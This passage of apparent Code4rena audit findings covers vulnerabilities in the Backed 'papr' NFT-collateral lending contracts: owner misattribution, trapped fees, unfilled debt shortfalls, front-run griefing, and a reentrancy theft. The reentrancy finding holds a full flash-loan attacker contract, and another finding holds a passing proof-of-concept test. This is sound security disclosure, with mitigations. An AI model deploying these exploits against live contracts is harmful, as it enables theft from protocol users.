"https://github.com/code-423n4/2022-12-backed-findings/issues/183", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-03"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159   # Vulnerability details  ## Impact Users will lose collateral NFTs when they are transferred to `PaprController` by an approved address or an operator. ## Proof of Concept The `PaprController` allows users to deposit NFTs as collateral to borrow Papr tokens. One of the way of depositing is by transferring an NFT to the contract directly via a call to `safeTransferFrom`: the contract implements the `onERC721Received` hook that will handle accounting of the transferred NFT ([PaprController.sol#L159](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159)). However, the hook implementation uses a wrong argument to identify token owner: the first argument, which is used by the contract to identify token owner, is the address of the `safeTransferFrom` function caller, which may be an approved address or an operator. The actual owner address is the second argument ([ERC721.sol#L436](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)): ```solidity try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) { ```  Thus, when an NFT is sent by an approved address or an operator, it'll be deposited to the vault of the approved address or operator: ```solidity // test/paprController/OnERC721ReceivedTest.sol  function testSafeTransferByOperator_AUDIT() public {     address operator = address(0x12345);      vm.prank(borrower);     nft.setApprovalForAll(operator, true);      vm.prank(operator);     nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));      // NFT was deposited to the operator's vault.     IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(operator, collateral.addr);     assertEq(vaultInfo.count, 1);      // Borrower has 0 tokens in collateral.     vaultInfo = controller.vaultInfo(borrower, collateral.addr);     assertEq(vaultInfo.count, 0); }  function testSafeTransferByApproved_AUDIT() public {     address approved = address(0x12345);      vm.prank(borrower);     nft.approve(approved, collateralId);      vm.prank(approved);     nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));      // NFT was deposited to the approved address's vault.     IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(approved, collateral.addr);     assertEq(vaultInfo.count, 1);      // Borrower has 0 tokens in collateral.     vaultInfo = controller.vaultInfo(borrower, collateral.addr);     assertEq(vaultInfo.count, 0); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider this change: ```diff --- a/src/PaprController.sol +++ b/src/PaprController.sol @@ -156,7 +156,7 @@ contract PaprController is      /// @param _id the id of the NFT      /// @param data encoded IPaprController.OnERC721ReceivedArgs      /// @return selector indicating succesful receiving of the NFT -    function onERC721Received(address from, address, uint256 _id, bytes calldata data) +    function onERC721Received(address, address from, uint256 _id, bytes calldata data)          external          override          returns (bytes4) ```"}, {"title": "Incorrect usage of safeTransferFrom traps fees in Papr Controller", "html_url": "https://github.com/code-423n4/2022-12-backed-findings/issues/110", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L382-L384   # Vulnerability details  ## Impact Because the Papr Controller never gives approval for ERC20 transfers, calls to `safeTransferFrom` on the Papr token will revert with insufficient approval. This will trap proceeds from auctions in the contract and prevent the owner/ DAO from collecting fees, motivating the rating of high severity. The root cause of this issue is misusing `safeTransferFrom` to transfer tokens directly out of the contract instead of using `transfer` directly. The contract will hold the token balance and thus does not need approval to transfer tokens, nor can it approve token transfers in the current implementation.  ## Proof of Concept Comment out [this token approval](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/OwnerFunctions.ft.sol#L67) as the controller contract does not implement functionality to call approve. It doesn't make sense to \"prank\" a contract account in this context because it deviates from the runtime behavior of the deployed contract. That is, it's impossible for the Papr Controller to approve token transfers. Run `forge test -m testSendPaprFromAuctionFeesWorksIfOwner` and observe that it fails because of insufficient approvals. Replace [the call to `safeTransferFrom`](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383) with a call to `transfer(to, amount)` and rerun the test. It will now pass and correctly achieve the intended behavior.   ## Tools Used  Foundry  ## Recommended Mitigation Steps Call `transfer(to, amount)` instead of `safeTrasferFrom` [here](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383). Note, it's unnecessary to use `safeTransfer` as the Papr token doesn't behave irregularly."}, {"title": "Stealing fund by applying reentrancy attack on `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`", "html_url": "https://github.com/code-423n4/2022-12-backed-findings/issues/102", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444   # Vulnerability details  ## Impact  By applying reentrancy attack involving the functions `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`, an Attacker can steal large amount of fund.  ## Proof of Concept   - Bob (a malicious user) deploys a contract to apply the attack. This contract is called `BobContract`. Please note that all the following transactions are going to be done in one transaction.  - BobContract takes a flash loan of 500K USDC.  - BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has price of almost 50k USDC.  - BobContract adds those NFTs as collateral by calling the function `addCollateral`. So `_vaultInfo[BobContract][collateral.addr].count = 10`. ``` function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {         for (uint256 i = 0; i < collateralArr.length;) {             _addCollateralToVault(msg.sender, collateralArr[i]);             collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);             unchecked {                 ++i;             }         }     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98  - BobContract borrows the max allowed amount of `PaprToken` that is almost equivalent to 250k USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the function `increaseDebt`.  ``` function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {         if (_lastUpdated == block.timestamp) {             return _maxDebt(totalCollateraValue, _target);         }          return _maxDebt(totalCollateraValue, newTarget());     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393 ``` function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {         uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;         return maxLoanUnderlying / cachedTarget;     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556 ``` function increaseDebt(         address mintTo,         ERC721 asset,         uint256 amount,         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo     ) external override {         _increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138  - BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 10*50k*50% = 250k.  - BobContract intends to call the function `removeCollateral`. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 9*50k*50%). https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109  - Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function `_removeCollateral`, the `safeTransferFrom` callbacks the BobContract. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444 https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120  - In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).  - BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the function `startLiquidationAuction` to put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and `_vaultInfo[BobContract][collateral.addr].count = 1`. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 1*50k*50% = 25k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297  - After calling the function `startLiquidationAuction`, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps, `info.count = 1`, so debt is larger than max debt.  ``` if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {             revert IPaprController.NotLiquidatable();         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317  - Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so `_vaultInfo[msg.sender][collateral.addr].count = 0`. Moreover, the starting price for this NFT will be `3*oraclePrice` (because the `auctionStartPriceMultiplier = 3`), so it will be almost 3 * 50k = 150k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341  - BobContract calls the function `purchaseLiquidationAuctionNFT` to buy it's own NFT with id 10 which is priced at almost 150k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264  - In this function, we have the followoing variables:    - `collateralValueCached ` = 150k * 0 = 0    - `isLastCollateral ` = TRUE    - `debtCached ` = 250k (same as before)    - `maxDebtCached ` = 250k    - `neededToSaveVault ` = 0    - `price ` = 150k Please note that the functions `_purchaseNFTAndUpdateVaultIfNeeded` and `_purchaseNFT` are called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72    - `excess ` = 150k Since it is larger than zero, the function `_handleExcess` is called. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532    - `fee ` = 15k Considering 10% fee on the excess    - `credit` = 135k    - `totalOwed ` = 135k Since this is smaller than `debtCaches` 250k, the function `_reduceDebt` is called to reduce debt from 250k to 115k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549    - `remaining` = 115k  - All the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, still 115k is remained as debt.  - In the last part of the function `purchaseLiquidationAuctionNFT`, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored. ``` if (isLastCollateral && remaining != 0) {             /// there will be debt left with no NFTs, set it to 0             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290  - Now, the control returns back to the contract `PaprController`. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed. ``` if (debt > max) {             revert IPaprController.ExceedsMaxDebt(debt, max);         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449  - Now that the attack is finished. BobContract repays the flash loan after selling those 10 NFTs.  - ***Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob's profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.***  - Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.  - Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.  - ***In order to take profit and steal fund, the attacker at least should add 7 NFTs as collateral and borrow the max debt. Because `numberOfNFT * oraclePrice * 50% > oraclePrice * 3`***  In the following PoC, I am showing how the attack can be applied. Bob deploys the following contract and calls the function `attack()`. It takes flash loan from AAVE, then the callback from the AAVE will execute `executeOperation`. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol.  Then, it borrows max debt which is almost 250k, and remove the NFT with id 1.  In the callback of `safeTransferFrom`, the function `onERC721Received` is called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively.  When NFTs with id 9 is removed, the function `startLiquidationAuction` is called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.0;  interface ERC721 {}  interface ERC20 {}  struct Collateral {     ERC721 addr;     uint256 id; } struct OracleInfo {     Message message;     Sig sig; } struct Message {     bytes32 id;     bytes payload;     uint256 timestamp;     bytes signature; } struct Sig {     uint8 v;     bytes32 r;     bytes32 s; } struct Auction {     address nftOwner;     uint256 auctionAssetID;     ERC721 auctionAssetContract;     uint256 perPeriodDecayPercentWad;     uint256 secondsInPeriod;     uint256 startPrice;     ERC20 paymentAsset; }  enum PriceKind {     SPOT,     TWAP,     LOWER,     UPPER }  interface IPaprController {     function addCollateral(Collateral[] calldata collateral) external;      function increaseDebt(         address mintTo,         ERC721 asset,         uint256 amount,         OracleInfo calldata oracleInfo     ) external;      function removeCollateral(         address sendTo,         Collateral[] calldata collateralArr,         OracleInfo calldata oracleInfo     ) external;      function startLiquidationAuction(         address account,         Collateral calldata collateral,         OracleInfo calldata oracleInfo     ) external returns (Auction memory auction);      function purchaseLiquidationAuctionNFT(         Auction calldata auction,         uint256 maxPrice,         address sendTo,         OracleInfo calldata oracleInfo     ) external;      function maxDebt(uint256 totalCollateraValue)         external         view         returns (uint256);      function underwritePriceForCollateral(         ERC721 asset,         PriceKind priceKind,         OracleInfo memory oracleInfo     ) external returns (uint256); }  interface IFundingRateController {     function updateTarget() external returns (uint256); }  interface IAAVE {     function flashLoanSimple(         address receiverAddress,         address asset,         uint256 amount,         bytes calldata params,         uint16 referralCode     ) external; }  contract BobContract {     IPaprController iPaprController;     IFundingRateController iFundingRateController;     IAAVE iAAVE;     ERC721 nftCollectionAddress;     ERC20 paprToken;     Collateral[] collaterals;     OracleInfo oracleInfo;     uint256 numOfCallback;     address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;      constructor(         address _paprControllerAddress,         address _fundingRateControllerAddress,         address _aaveAddress,         ERC721 _nftCollectionAddress,         OracleInfo memory _oracleInfo,         ERC20 _paprToken     ) {         iPaprController = IPaprController(_paprControllerAddress);         iFundingRateController = IFundingRateController(             _fundingRateControllerAddress         );         iAAVE = IAAVE(_aaveAddress);         nftCollectionAddress = _nftCollectionAddress;         oracleInfo = _oracleInfo;         paprToken = _paprToken;     }      function attack() public {         ///// STEP1: taking flash loan         iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, \"\", 0);     }      function executeOperation(         address[] calldata assets,         uint256[] calldata amounts,         uint256[] calldata premiums,         address initiator,         bytes calldata params     ) external returns (bool) {         ///// STEP2: buying 10 NFTs          // Buy 10 NFTs that each worths almost 50k         // Assume the ids are from 1 to 10          ///// STEP3: adding the NFTs as collateral         for (uint256 i = 0; i < 10; ++i) {             collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));         }         iPaprController.addCollateral(collaterals);          ///// STEP4: borrowing as much as possible         uint256 oraclePrice = iPaprController.underwritePriceForCollateral(             nftCollectionAddress,             PriceKind.LOWER,             oracleInfo         );          uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);          iPaprController.increaseDebt(             address(this),             nftCollectionAddress,             maxDebt,             oracleInfo         );          ///// STEP5: removing the NFT with id 1         Collateral[] memory collateralArr = new Collateral[](1);         collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});         iPaprController.removeCollateral(             address(this),             collateralArr,             oracleInfo         );          ///// STEP16: selling 10 NFTs and repaying the flash loan          // Selling the 10 NFTs         // Repaying the flash loan     }      function onERC721Received(         address from,         address,         uint256 _id,         bytes calldata data     ) external returns (bytes4) {         numOfCallback++;         if (numOfCallback < 9) {             ///// STEP6 - STEP13: removing the NFTs with id 2 to 9             Collateral[] memory collateralArr = new Collateral[](1);             collateralArr[0] = Collateral({                 addr: nftCollectionAddress,                 id: _id + 1             });             iPaprController.removeCollateral(                 address(this),                 collateralArr,                 oracleInfo             );         } else {             ///// STEP14: starting the auction for NFT with id 10             Collateral memory lastCollateral = Collateral({                 addr: nftCollectionAddress,                 id: _id + 1             });             iPaprController.startLiquidationAuction(                 address(this),                 lastCollateral,                 oracleInfo             );              ///// STEP15: buying the NFT with id 10 on the auction             uint256 oraclePrice = iPaprController.underwritePriceForCollateral(                 nftCollectionAddress,                 PriceKind.LOWER,                 oracleInfo             );             uint256 startPrice = (oraclePrice * 3 * 1e18) /                 iFundingRateController.updateTarget();              Auction memory auction = Auction({                 nftOwner: address(this),                 auctionAssetID: 10,                 auctionAssetContract: nftCollectionAddress,                 perPeriodDecayPercentWad: 0.7e18,                 secondsInPeriod: 1 days,                 startPrice: startPrice,                 paymentAsset: paprToken             });              iPaprController.purchaseLiquidationAuctionNFT(                 auction,                 startPrice,                 address(this),                 oracleInfo             );         }     } }  ```  ## Tools Used  ## Recommended Mitigation Steps  - Adding a reentrancy guard to the involved functions can be a solution."}, {"title": "Borrowers may earn auction proceeds without filling the debt shortfall", "html_url": "https://github.com/code-423n4/2022-12-backed-findings/issues/97", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-01"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264-L294   # Vulnerability details  ## Impact The proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.  ## Proof of Concept  Assume N is an allowed NFT, B is a borrower, the vault V is `_vaultInfo[B][N]`:  1. B add two NFTs(N-1 and N-2) as collaterals to vault V. 2. B [increaseDebt()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138) of vault V. 3. The vault V becomes liquidatable 4. Someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-1. 5. No one buys N-1 because the price of N is falling 6. After [liquidationAuctionMinSpacing - 2days](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L41), someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-2 7. Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:   ```solidity   if (isLastCollateral && remaining != 0) {       /// there will be debt left with no NFTs, set it to 0       _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);   }   ``` 8. Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-2. All the excess will be transferred to B because `neededToSaveVault` is 0 and `debtCached` is 0:   ```solidity   if (excess > 0) {       remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);   }   ```  **The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.** Test code for PoC: ```solidity diff --git a/test/paprController/PoC.sol b/test/paprController/PoC.sol new file mode 100644 index 0000000..0b12914 --- /dev/null +++ b/test/paprController/PoC.sol @@ -0,0 +1,147 @@ +// SPDX-License-Identifier: GPL-2.0-or-later +pragma solidity ^0.8.17; + +import \"forge-std/console.sol\"; +import {ERC721} from \"solmate/tokens/ERC721.sol\"; + +import {ReservoirOracleUnderwriter} from \"../../src/ReservoirOracleUnderwriter.sol\"; +import {INFTEDA} from \"../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol\"; + +import {BasePaprControllerTest} from \"./BasePaprController.ft.sol\"; +import {IPaprController} from \"../../src/interfaces/IPaprController.sol\"; + +contract PoC is BasePaprControllerTest { +    event ReduceDebt(address indexed account, ERC721 indexed collateralAddress, uint256 amount); +    event Transfer(address indexed from, address indexed to, uint256 amount); + +    INFTEDA.Auction auction1; +    INFTEDA.Auction auction2; +    address purchaser = address(2); + +    function setUp() public override { +        super.setUp(); + +        // mint a second collateral +        nft.mint(borrower, collateralId+1); +        // add collaterals, loan max and sells +        _addCollaterals(); +        _loanMaxAndSell(); +        // borrower now has 2.9... USD +        assertGt(underlying.balanceOf(borrower), 2.9e6); + +        // prepare purchaser +        vm.startPrank(purchaser); +        safeTransferReceivedArgs.debt = controller.maxDebt(oraclePrice) - 10; +        safeTransferReceivedArgs.proceedsTo = purchaser; +        safeTransferReceivedArgs.swapParams.minOut = 0; +        for (uint i = 0; i < 3; i ++) { +            nft.mint(purchaser, 10+i); +            nft.safeTransferFrom(purchaser, address(controller), 10+i, abi.encode(safeTransferReceivedArgs)); +        } +        vm.stopPrank(); +        // purchaser now has 4.4... papr +        assertGt(debtToken.balanceOf(purchaser), 4.4e18); + +        // make max loan liquidatable +        vm.warp(block.timestamp + 1 days); +        priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP; +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +    } + +    function testPoC() public { +        vm.startPrank(purchaser); +        debtToken.approve(address(controller), type(uint256).max); + +        // start auction1, collateralId +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        auction1 = controller.startLiquidationAuction(borrower, collateral, oracleInfo); + +        // nobody purchage auction1 for some reason(like nft price falling) + +        // start auction2, collateralId+1 +        vm.warp(block.timestamp + controller.liquidationAuctionMinSpacing()); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        auction2 = controller.startLiquidationAuction( +            borrower, IPaprController.Collateral({id: collateralId+1, addr: nft}),  oracleInfo); + +        IPaprController.VaultInfo memory info = controller.vaultInfo(borrower, collateral.addr); +        assertGt(info.debt, 2.99e18); + +        // purchase auction1 +        uint256 beforeBalance = debtToken.balanceOf(borrower); +        uint256 price = controller.auctionCurrentPrice(auction1); +        uint256 penalty = price * controller.liquidationPenaltyBips() / 1e4; +        uint256 reduced = price - penalty; +        uint256 shortfall = info.debt - reduced; +        // burn penalty +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), penalty); +        // reduce debt (partial) +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, reduced); +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), reduced); +        //!! burning the shortfall debt not covered by auction +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, shortfall); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        controller.purchaseLiquidationAuctionNFT(auction1, price, purchaser, oracleInfo); + +        // reduced: 0.65.. +        assertLt(reduced, 0.66e18); +        // fortfall: 2.34.. +        assertGt(shortfall, 2.34e18); +        //!! debt is 0 now +        info = controller.vaultInfo(borrower, collateral.addr); +        assertEq(info.debt, 0); + +        // purchase auction2 +        // https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29 +        vm.warp(block.timestamp + 78831); +        beforeBalance = debtToken.balanceOf(borrower); +        price = controller.auctionCurrentPrice(auction2); +        penalty = price * controller.liquidationPenaltyBips() / 1e4; +        uint256 payouts = price - penalty; +        // burn penalty +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), penalty); +        //!! reduce 0 because debt is 0 +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, 0); +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), 0); +        //!! borrower get the payouts that should be used to reduce the shortfall debt +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), borrower, payouts); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        controller.purchaseLiquidationAuctionNFT(auction2, price, purchaser, oracleInfo); + +        //!! borrower wins +        uint256 afterBalance = debtToken.balanceOf(borrower); +        assertEq(afterBalance - beforeBalance, payouts); +        assertGt(payouts, 2.4e18); +    } + +    function _addCollaterals() internal { +        vm.startPrank(borrower); +        nft.setApprovalForAll(address(controller), true); +        IPaprController.Collateral[] memory c = new IPaprController.Collateral[](2); +        c[0] = collateral; +        c[1] = IPaprController.Collateral({id: collateralId+1, addr: nft}); +        controller.addCollateral(c); +        vm.stopPrank(); +    } + +    function _loanMaxAndSell() internal { +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        IPaprController.SwapParams memory swapParams = IPaprController.SwapParams({ +            amount: controller.maxDebt(oraclePrice*2) - 4, +            minOut: 1, +            sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: true}), +            swapFeeTo: address(0), +            swapFeeBips: 0 +        }); +        vm.prank(borrower); +        controller.increaseDebtAndSell(borrower, collateral.addr, swapParams, oracleInfo); +    } +} ```  Test output: ``` Running 1 test for test/paprController/PoC.sol:PoC [PASS] testPoC() (gas: 720941) Test result: ok. 1 passed; 0 failed; finished in 1.21s ```  ## Tools Used VS Code  ## Recommended Mitigation Steps  The debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.  Implementation code: ```solidity diff --git a/src/PaprController.sol b/src/PaprController.sol index 284b3f4..d7e4cea 100644 --- a/src/PaprController.sol +++ b/src/PaprController.sol @@ -61,6 +61,8 @@ contract PaprController is       /// @dev account => asset => vaultInfo      mapping(address => mapping(ERC721 => IPaprController.VaultInfo)) private _vaultInfo; +    /// @dev account => asset => shortfall amount +    mapping(address => mapping(ERC721 => uint256)) private _shortfall;       /// @dev does not validate args      /// e.g. does not check whether underlying or oracleSigner are address(0) @@ -288,6 +290,8 @@ contract PaprController is          }           if (isLastCollateral && remaining != 0) { +            // increase shortfall +            _shortfall[auction.nftOwner][auction.auctionAssetContract] += remaining;              /// there will be debt left with no NFTs, set it to 0              _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);          } @@ -408,6 +412,10 @@ contract PaprController is          return _vaultInfo[account][asset];      }  +    function shortfall(address account, ERC721 asset) external view returns (uint256) { +        return _shortfall[account][asset]; +    } +      /// INTERNAL NON-VIEW ///       function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal { @@ -543,7 +551,20 @@ contract PaprController is              // we owe them more papr than they have in debt              // so we pay down debt and send them the rest              _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), debtCached); -            papr.transfer(auction.nftOwner, totalOwed - debtCached); + +            uint256 payout = totalOwed - debtCached; +            uint256 burnShortfall = _shortfall[auction.nftOwner][auction.auctionAssetContract]; +            if (burnShortfall >= payout) { +                burnShortfall = payout; +            } +            if (burnShortfall > 0) { +                // burn the previous shortfall +                PaprToken(address(papr)).burn(address(this), burnShortfall); +                _shortfall[auction.nftOwner][auction.auctionAssetContract] -= burnShortfall; +            } +            if (payout > burnShortfall) { +                papr.transfer(auction.nftOwner, payout - burnShortfall); +            }          } else {              // reduce vault debt              _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), totalOwed); ``` "}, {"title": "Grieving attack by failing user's transactions", "html_url": "https://github.com/code-423n4/2022-12-backed-findings/issues/92", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-03"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486   # Vulnerability details  ## Impact  An attacker can apply grieving attack by preventing users from interacting with some of the protocol functions. In other words whenever a user is going to reduce his debt, or buy and reduce his debt in one tx, it can be failed by the attacker.  ## Proof of Concept In the following scenario, I am explaining how it is possible to fail user's transaction to reduce their debt fully. Failing other transaction (buy and reduce the debt in one tx) can be done similarly.   - Suppose Alice (an honest user) has debt of 1000 `PaprToken` and she intends to repay her debt fully:   - So, she calls the function `reduceDebt` with the following parameters:    - `account`: Alice's address    - `asset`: The NFT which was used as collateral    - `amount`: 1000 * 10**18 (decimal of `PaprToken` is 18). ``` function reduceDebt(address account, ERC721 asset, uint256 amount) external override {         _reduceDebt({account: account, asset: asset, burnFrom: msg.sender, amount: amount});     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L148  - Bob (a malicious user who owns a small amount of `PaprToken`) notices Alice's transaction in the Mempool. So, Bob applies front-run attack and calls the function `reduceDebt` with the following parameters:    - `account`: Alice's address    - `asset`: The NFT which was used as collateral    - `amount`: 1  - By doing so, Bob repays only **1** `PaprToken` on behalf of 